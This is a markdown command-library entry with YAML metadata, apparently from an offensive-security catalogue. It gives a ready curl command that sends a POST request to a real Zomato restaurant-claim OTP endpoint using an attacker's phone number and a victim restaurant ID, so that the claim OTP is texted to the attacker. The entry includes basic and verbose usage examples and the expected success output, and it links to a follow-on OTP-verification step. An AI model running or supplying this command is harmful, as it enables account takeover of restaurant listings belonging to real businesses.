---
data: >-
  curl -X POST
  https://www.zomato.com/restaurant-onboard-diy/v2/send-auto-claim-otp -H
  "Content-Type: application/json" -d '{"number": "ATTACKER_PHONE", "isdCode":
  "+91", "resId": "VICTIM_RESID"}'
tags:
  - api
  - otp
type: command
output: '{"status":"success","requestId":"abc123","message":"OTP sent to your phone"}'
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:36.421Z'
id: d02831d1-1b80-4e06-9090-93633b86acd1
verified: false
validated: true
submitted: true
---
# curl-send-otp-request

## Command

```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/send-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"number": "ATTACKER_PHONE", "isdCode": "+91", "resId": "VICTIM_RESID"}'
```

## Description

This command sends a POST request to Zomato's OTP initiation endpoint using curl, specifying an arbitrary phone number and target restaurant ID to trigger SMS delivery of an OTP to the attacker.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON payload header | Yes |
| `-d '{...}'` | JSON data with number (phone), isdCode (country code), resId (restaurant ID) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.zomato.com/restaurant-onboard-diy/v2/send-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"number": "9876543210", "isdCode": "+91", "resId": "123456"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST https://www.zomato.com/restaurant-onboard-diy/v2/send-auto-claim-otp \
  -H "Content-Type: application/json" \
  -d '{"number": "9876543210", "isdCode": "+91", "resId": "123456"}'
```

## Expected Output

JSON response indicating success, including a requestId for verification: {"status":"success","requestId":"abc123","message":"OTP sent"}.

## Related

- [[commands/curl-verify-otp-claim]]
- [[procedures/Send-OTP-Request-with-Arbitrary-Phone-Number]]
